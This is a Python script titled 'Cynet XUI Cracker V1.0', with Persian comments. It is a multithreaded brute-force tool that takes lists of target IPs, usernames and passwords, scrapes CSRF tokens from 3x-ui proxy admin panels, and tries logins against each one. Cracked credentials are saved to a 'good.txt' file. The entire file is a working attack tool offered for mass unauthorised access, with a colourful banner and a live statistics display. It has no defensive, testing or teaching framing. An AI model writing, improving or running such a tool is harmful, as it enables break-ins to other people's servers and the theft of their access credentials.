# Cynet_Xui_Cracker_V1.0.py
import requests
import threading
import sys
import json
import re
import time
import os
from urllib.parse import urljoin
from datetime import datetime

# ========== تنظیمات ==========
VERSION = "V1.0"
AUTHOR = "@cynetx"
DELAY = 0.2
REFRESH_RATE = 0.3

# ========== رنگ‌ها ==========
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[97m'
    END = '\033[0m'

# ========== بنر ==========
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.CYAN}   ██████╗██╗   ██╗███╗   ██╗███████╗████████╗           {Colors.RED}║
{Colors.RED}║{Colors.CYAN}  ██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝           {Colors.RED}║
{Colors.RED}║{Colors.CYAN}  ██║      ╚████╔╝ ██╔██╗ ██║█████╗     ██║              {Colors.RED}║
{Colors.RED}║{Colors.CYAN}  ██║       ╚██╔╝  ██║╚██╗██║██╔══╝     ██║              {Colors.RED}║
{Colors.RED}║{Colors.CYAN}  ╚██████╗   ██║   ██║ ╚████║███████╗   ██║              {Colors.RED}║
{Colors.RED}║{Colors.CYAN}   ╚═════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝              {Colors.RED}║
{Colors.RED}╠══════════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.GREEN}         XUI CRACKER {VERSION} - {AUTHOR}            {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}         [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]                                {Colors.RED}║
{Colors.RED}╚══════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

# ========== نمایش آمار (ساده و تمیز) ==========
def print_stats(stats):
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    print(f"{Colors.BLUE}╔══════════════════════════════════════════════════════════════╗")
    print(f"{Colors.BLUE}║{Colors.YELLOW}  📊 LIVE STATISTICS                            {Colors.BLUE}║")
    print(f"{Colors.BLUE}╠══════════════════════════════════════════════════════════════╣")
    print(f"{Colors.BLUE}║{Colors.CYAN}  🔄 Total Attempts : {Colors.WHITE}{str(stats['total']):<42}{Colors.BLUE}║")
    print(f"{Colors.BLUE}║{Colors.GREEN}  ✅ Good (Found)  : {Colors.GREEN}{str(stats['found']):<42}{Colors.BLUE}║")
    print(f"{Colors.BLUE}║{Colors.RED}  ❌ Failed        : {Colors.RED}{str(stats['failed']):<42}{Colors.BLUE}║")
    print(f"{Colors.BLUE}║{Colors.YELLOW}  ⚠️  Bad (No XUI)  : {Colors.YELLOW}{str(stats['bad']):<42}{Colors.BLUE}║")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════════════════════════╝{Colors.END}")

def load_list(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def get_csrf_and_cookies(target_url, manual_cookie=None):
    session = requests.Session()
    if manual_cookie:
        session.cookies.set("3x-ui", manual_cookie)
    try:
        response = session.get(target_url + "/", timeout=5)
        if response.status_code == 200:
            csrf_token = None
            patterns = [
                r'name="csrf_token"\s+value="([^"]+)"',
                r'csrf-token\s*:\s*"([^"]+)"',
                r'x-csrf-token\s*:\s*"([^"]+)"',
                r'<meta[^>]+csrf-token[^>]+content="([^"]+)"',
                r'var\s+csrf_token\s*=\s*"([^"]+)"'
            ]
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    csrf_token = match.group(1)
                    break
            if not csrf_token and 'x-csrf-token' in response.headers:
                csrf_token = response.headers['x-csrf-token']
            return session, csrf_token
        return session, None
    except:
        return session, None

def check_login(target_url, username, password, session, csrf_token):
    login_url = urljoin(target_url, "/login")
    payload = {"username": username, "password": password, "twoFactorCode": ""}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": target_url,
        "Referer": target_url + "/login",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }
    if csrf_token:
        headers["x-csrf-token"] = csrf_token
    
    try:
        response = session.post(login_url, data=payload, headers=headers, timeout=5)
        if response.status_code == 503 or response.status_code == 403:
            return False, None
        try:
            json_resp = response.json()
            if json_resp.get("success") == True:
                return True, f"{username}:{password}"
            return False, None
        except:
            if "dashboard" in response.text.lower() or "panel" in response.text.lower():
                return True, f"{username}:{password}"
            return False, None
    except:
        return False, None

def worker(target_url, usernames, passwords, session, csrf_token, result, stop_event, stats, target_status):
    for user in usernames:
        if stop_event.is_set():
            break
        for pwd in passwords:
            if stop_event.is_set():
                break
            stats['total'] += 1
            success, credential = check_login(target_url, user, pwd, session, csrf_token)
            if success:
                result.append(credential)
                stats['found'] += 1
                target_status['status'] = 'good'
                with open("good.txt", "a", encoding="utf-8") as f:
                    f.write(f"{target_url} | {credential} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                return
            time.sleep(DELAY)
    
    if target_status['status'] == 'unknown':
        target_status['status'] = 'failed'
        stats['failed'] += 1

def updater(stats, stop_event):
    """ترد مجزا برای به‌روزرسانی لحظه‌ای آمار"""
    while not stop_event.is_set():
        print_stats(stats)
        time.sleep(REFRESH_RATE)

def main():
    print_banner()
    
    ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Enter IP list file (IP:PORT): {Colors.END}").strip()
    if not ip_file:
        ip_file = "ips.txt"
    
    user_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Enter Username list file: {Colors.END}").strip()
    if not user_file:
        user_file = "users.txt"
    
    pass_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Enter Password list file: {Colors.END}").strip()
    if not pass_file:
        pass_file = "passwords.txt"
    
    manual_cookie = input(f"{Colors.CYAN}[?] {Colors.WHITE}Enter 3x-ui cookie (or press Enter to skip): {Colors.END}").strip()
    if not manual_cookie:
        manual_cookie = None
    
    thread_count = input(f"{Colors.CYAN}[?] {Colors.WHITE}Enter Threads (default 5): {Colors.END}").strip()
    try:
        thread_count = int(thread_count) if thread_count else 5
        if thread_count < 1:
            thread_count = 5
    except:
        thread_count = 5
    
    ips = load_list(ip_file)
    if not ips:
        print(f"{Colors.RED}[-] No IPs found in {ip_file}{Colors.END}")
        return
    
    usernames = load_list(user_file)
    if not usernames:
        print(f"{Colors.RED}[-] No usernames found in {user_file}{Colors.END}")
        return
    
    passwords = load_list(pass_file)
    if not passwords:
        print(f"{Colors.RED}[-] No passwords found in {pass_file}{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}[+] Loaded: {len(ips)} IPs, {len(usernames)} Users, {len(passwords)} Passwords{Colors.END}")
    print(f"{Colors.CYAN}[+] Starting attack...{Colors.END}\n")
    
    with open("good.txt", "w", encoding="utf-8") as f:
        f.write(f"# Cynet XUI Cracker {VERSION}\n")
        f.write(f"# Found Credentials - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("#" + "=" * 60 + "\n\n")
    
    stats = {'total': 0, 'found': 0, 'failed': 0, 'bad': 0}
    result = []
    stop_event = threading.Event()
    
    # ===== راه‌اندازی ترد به‌روزرسان =====
    updater_thread = threading.Thread(target=updater, args=(stats, stop_event))
    updater_thread.daemon = True
    updater_thread.start()
    
    try:
        for ip in ips:
            if not ip.startswith("http"):
                target_url = "http://" + ip
            else:
                target_url = ip
            target_url = target_url.rstrip("/")
            
            session, csrf_token = get_csrf_and_cookies(target_url, manual_cookie)
            
            if not csrf_token:
                stats['bad'] += 1
                continue
            
            target_status = {'status': 'unknown'}
            
            threads = []
            chunk_size = max(1, len(usernames) // thread_count)
            for i in range(thread_count):
                start = i * chunk_size
                end = (i + 1) * chunk_size if i < thread_count - 1 else len(usernames)
                chunk = usernames[start:end]
                if chunk:
                    new_session, new_token = get_csrf_and_cookies(target_url, manual_cookie)
                    if not new_token:
                        new_token = csrf_token
                    t = threading.Thread(target=worker, args=(
                        target_url, chunk, passwords, new_session, new_token, result, stop_event, stats, target_status
                    ))
                    threads.append(t)
                    t.start()
            
            # منتظر ماندن برای اتمام تردهای کارگر
            for t in threads:
                t.join()
            
            if target_status['status'] == 'failed':
                stats['failed'] += 1
        
        # پایان کار
        stop_event.set()
        updater_thread.join(timeout=1)
        print_stats(stats)
        print(f"\n{Colors.GREEN}[+] Finished! Check good.txt for credentials.{Colors.END}")
        
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Exited by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.END}")